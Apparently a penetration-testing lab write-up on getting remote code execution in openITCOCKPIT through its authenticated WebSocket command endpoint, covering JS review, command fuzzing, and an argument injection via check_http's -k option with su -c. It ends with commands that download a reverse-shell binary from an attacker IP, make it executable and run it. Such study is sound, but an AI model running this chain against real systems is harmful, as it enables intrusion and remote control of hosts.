# WebSocket RCE

From the XSS, we have access to the content of an authenticated user and can start hunting for something tom help run system commands. 

Through the captured files, we can look for interesting keywords to speed up the exploit-hunting process, such as commands, cronjobs and service escalations. 

In particular, the `commands.html` file contains an `appData` object, which has interesting contents.

```json
var appData = 
{
  "jsonData": {
    "isAjax": false,
    "isMobile": false,
    "websocket_url": "wss://openitcockpit/sudo_server",
    "akey": "1fea123e07f730f76e661bced33a94152378611e"
  },
  "webroot": "https://openitcockpit/",
  "url": "",
  "controller": "Commands",
  "action": "index",
  "params": {
    "named": [],
    "pass": [],
    "plugin": "",
    "controller": "commands",
    "action": "index"
  },
  "Types": {
    "CODE_SUCCESS": "success",
    "CODE_ERROR": "error",
    "CODE_EXCEPTION": "exception",
    "CODE_MISSING_PARAMETERS": "missing_parameters",
    "CODE_NOT_AUTHENTICATED": "not_authenticated",
    "CODE_AUTHENTICATION_FAILED": "authentication_failed",
    "CODE_VALIDATION_FAILED": "validation_failed",
    "CODE_NOT_ALLOWED": "not_allowed",
    "CODE_NOT_AVAILABLE": "not_available",
    "CODE_INVALID_TRIGGER_ACTION_ID": "invalid_trigger_action_id",
    "ROLE_ADMIN": "admin",
    "ROLE_EMPLOYEE": "employee"
  }
};
```

The code defines a WebSocket URL that ends in `sudo_server`, after which a key named `akey` is defined with a value that looks like a hash. 

## Websockets

WebSocket is a browser-based communication protocol that uses HTTP for the initial connection creates a **full-duplex** connection for fast communication between client and server. 

In properly built solutions, initial HTTP connections authenticate the user, and each subsequent request would not require authentication. However, many developers instead “roll” their authentication, in this case, a key is provided in the same object as the URL and is likely used for authentication. WebSocket functionalities often have **weak authentication** and thus increase the **risk profile** of an application. 

In a web application, WebSocket connections are initiated with JavaScript, an uncompiled language. As such, the source defining the WebSocket connection must be located in one of the JS files loaded on this page. While there are many defined, we can exclude plugins, vendor or lib files.

```bash
cat commands.html | grep -E "script.*src" | grep -Ev "vendor|lib|plugin"
```

We can make a list of JS files and then download them. Use sublime text JSFormat to make the JS files readable. 

```bash
wget --no-check-certificate -q -i <list>
```

## Code Review

We find the WebSocket connection code in the file `compressed_components.js` in the function `WebsocketSudoComponent`

```jsx
send: function(json, connection) {
	connection = connection || this._connection;
	connection.send(json)
},
```

From here, we can look through all the JS files to build a list of js commands.

```
**angular-directives.js**
sendHostNotification
submitHoststateAck
submitEnableServiceNotifications
commitPassiveResult
sendCustomServiceNotification
submitDisableServiceNotifications
submitDisableHostNotifications
enableOrDisableServiceFlapdetection
rescheduleService
submitServiceDowntime
submitHostDowntime
submitDisableServiceNotifications
commitPassiveServiceResult
submitEnableHostNotifications
submitServicestateAck
submitEnableServiceNotifications
rescheduleHost
enableOrDisableHostFlapdetection
****
**components.js**
requestUniqId
keepAlive
****
**controllers.js**
5238f8e57e72e81d44119a8ffc3f98ea
package_uninstall
package_install
d41d8cd98f00b204e9800998ecf8427e
apt_get_update
nagiostats
execute_nagios_command
```

In particular, those in `controller.js` seem to run system-level commands. This code, which calls the WebSocket with `execute_nagios_command`, may lead to RCE. `jqconsole` refers to a jQuery terminal plugin. 

```jsx
loadConsole: function() {
		this.$jqconsole = $('#console').jqconsole('', 'nagios$ ');
		this.$jqconsole.Write(this.getVar('console_welcome'));
		var startPrompt = function() {
			var self = this;
			self.$jqconsole.Prompt(!0, function(input) {
				self.WebsocketSudo.send(self.WebsocketSudo.toJson('execute_nagios_command', input));
				startPrompt()
			})
		}.bind(this);
		startPrompt()
	},
```

## Decoding WebSocket Communication

Tracing back, we find the functionality for the function `toJson`. The function takes 2 arguments, the task (which is `execute_nagios_command`) and an input data. It then adds the parameters `uniqid` and `key`, which we’ll need to trace further. 

```jsx
toJson: function(task, data) {
		var jsonArr = [];
		jsonArr = JSON.stringify({
			task: task,
			data: data,
			uniqid: this._uniqid,
			key: this._key
		});
		return jsonArr
	},
```

We find that `uniqid` is defined in a function named `_onResponse`, where it is defined as follows. This suggests that it is executed when a message comes in and is set to a value set by the server. On the other hand, we find that the key is set up in `app_controller.js` and references the `akey` variable in `commands.html`.  

```jsx
setup: function(wsURL, key) {
		this._wsUrl = wsURL;
		this._key = key
	},
	
this.WebsocketSudo.setup(this.getVar('websocket_url'), this.getVar('akey'));
```

To properly exploit the WebSocket, we should inspect the **initial** connection process to ensure we aren’t missing anything. We’ll look for the connect function (regex `connect.*function`). The connect function creates a new WebSocket connection, then sets the `onopen, onmessage, onerror` event handlers. The `onopen` handler indirectly sends the `requestUniqId` request to the server requesting a unique Id. 

```jsx
connect: function() {
		if (this._connection === null) {
			this._connection = new WebSocket(this._wsUrl)
		}
		this._connection.onopen = this._onConnectionOpen.bind(this);
		this._connection.onmessage = this._onResponse.bind(this);
		this._connection.onerror = this._onError.bind(this);
		return this._connection
	},
	
	_onConnectionOpen: function(e) {
		this.requestUniqId()
	},
	
	requestUniqId: function() {
		this.send(this.toJson('requestUniqId', ''))
	},
```

## WebSocket Client

While the official client sent request to generate uniqid on connection, the server actually does this automatically. 

We’ll write a client to interact with the server: we need to define the functions `on_message`, `on_error`, `on_close`, and `on_open`.

Of the different messages:

- The server occasionally sends `dispatcher`requests, which can simply be ignored
- When we try to submit a `whoami` command, we receive the error message “Forbidden command”. This suggests there is some list of white/blacklisted commands, and that we should fuzz against it to find what commands we can use.
    - Fuzzing wordlist: [raw.githubusercontent.com/yzf750/custom-fuzzing/master/linux-commands-builtin.txt](https://raw.githubusercontent.com/yzf750/custom-fuzzing/master/linux-commands-builtin.txt)
- Here is the list of successful commands

```jsx
:
[
alias
bg
bind
break
builtin
caller
cd
command
compgen
complete
compopt
continue
declare
dirs
disown
echo
enable
eval
exec
exit
export
false
fc
fg
getopts
hash
help
history
jobs
kill
let
local
logout
mapfile
popd
printf
pushd
pwd
read
readarray
readonly
return
set
shift
shopt
source
suspend
test
times
trap
true
type
typeset
ulimit
umask
unalias
unset
wait
```

## Bypassing Filters

Once we’ve found some working commands, we can try to **escape** the command to have unrestricted RCE. [FuzzDB](https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/os-cmd-execution/command-injection-template.txt) is a dictionary of attacks for blackbox testing, and we can loop through each of these, and send them to the server to discover if any allow us to inject. 

From the above command testing, we find that commands like `pwd` may work, but that those like `whoami` do not. We’ll use these fuzzing techniques to try to extract out a method that allows us to use the disallowed commands. 

For some of these injection attempts, we’ll instead get the response “Warning: This command contains illegal characters, to run this command is only allowed from the read CLI!”

Based on testing, this applies for the characters `;$|`

However, none of these injection attempts work. 

### LOTL

When we run the `ls` command, we find there are some scripts running in the present directory. 

One of them in particular is called `check_http`. 

```jsx
check_http -H <vhost> | -I <IP-address> [-u <uri>] [-p <port>]
[-J <client certificate file>] [-K <private key>]
[-w <warn time>] [-c <critical time>] [-t <timeout>] [-L] [-E] [-a auth]
[-b proxy_auth] [-f <ok|warning|critcal|follow|sticky|stickyport>]
[-e <expect>] [-d string] [-s string] [-l] [-r <regex> | -R <case-insensitive regex>]
[-P string] [-m <min_pg_size>:<max_pg_size>] [-4|-6] [-N] [-M <age>]
[-A string] [-k string] [-S <version>] [--sni] [-C <warn_age>[,<crit_age>]]
[-T <content-type>] [-j method]
```

While there is no direct code execution, the `-k` argument allows us to inject **custom headers** into the request. This might be useful since it effectively provides us with a blank slate to inject commands. Testing application functionality, we find that a HTTP request to Kali with a regular HTTP port (i.e. 80) returns a response. `./check_http -I <ip> -p 80`

![Untitled](WebSocket%20RCE%209355aa919b854eefafe37a538fe64323/Untitled.png)

When we try adding `-k "test1 test2"` to the command, we find that another header is added to the request we received for the first test, and that the second test is included in the host header. Notably, however, we notice that our quote is being escaped and separated into the fields. 

![Untitled](WebSocket%20RCE%209355aa919b854eefafe37a538fe64323/Untitled%201.png)

When we try the same thing with a single quote instead, it simply returns string1 as the header. Usually, when single and double quotes aren't handled the same way, there’s some sort of inconsistency and unexpected character injection going on. When using a single quote, we might be injecting `test2`as another command.

![Untitled](WebSocket%20RCE%209355aa919b854eefafe37a538fe64323/Untitled%202.png)

If we inject `--help` as the second injected command, we get a help message for the `su` command. As such, we can use `su -c` to inject any command that we want. 

![Untitled](WebSocket%20RCE%209355aa919b854eefafe37a538fe64323/Untitled%203.png)

A possible command could look like this

```bash
su user -c '<input>'
su user -c './check_http -I <ip> -p 80 -k 'test -c 'echo "test"' 

Injection string for multi-word command:
./check_http -I 192.168.45.239 -p 80 -k 'test1 -c 'echo "test" 

Ping test:
./check_http -I 192.168.45.239 -p 80 -k 'test1 -c 'ping -c 4 192.168.45.239

Shell:
./check_http -I 192.168.45.239 -p 80 -k 'test1 -c 'wget http://192.168.45.239:8000/reverse.elf -O /tmp/reverse.elf
./check_http -I 192.168.45.239 -p 80 -k 'test1 -c 'chmod +x /tmp/reverse.elf
./check_http -I 192.168.45.239 -p 80 -k 'test1 -c '/tmp/reverse.elf

```